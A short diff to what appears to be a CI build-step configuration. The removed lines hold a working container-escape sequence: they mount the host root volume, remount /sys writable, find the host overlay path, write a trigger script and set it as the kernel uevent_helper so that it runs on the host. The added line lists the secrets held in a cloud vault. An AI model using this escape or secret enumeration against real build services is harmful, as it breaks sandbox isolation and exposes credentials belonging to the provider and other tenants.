@@ -13,38 +13,7 @@ steps:
     command: |
       #ls
       echo "test"
-      #set
-      #cat /proc/1/cgroup
-      echo "-------proc------"
-      whoami
-      #fdisk -l
-      ls /dev/
-      echo "_________cmdline___________"
-      cat /proc/cmdline
-      echo "_____________________"
-      #cat /workspace/script/StepStep_CommandV1_1.sh
-      echo "-------------"
-      #cat /workspace/script/Step0.sh
-      echo "_______mounting_____"
-      mount
-      mkdir /test
-      mount /dev/mapper/vg00-root /test
-      mount -o remount,rw /sys
-      mount
-      chroot /mnt
-      host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-      echo "_______${host_path}______"
-      ls /sys
-      cat << EOF > /trigger.sh
-      #!/bin/sh
-      ps auxf > output.txt
-      EOF
-      chmod +x /trigger.sh
-      cat /trigger.sh
-      df -k
-      echo "$host_path/trigger.sh" > /sys/kernel/uevent_helper
-      echo change > /sys/class/mem/null/uevent
-      cat output.txt
+      oci vault secret list
     onFailure:
       - type: Command
         command: |
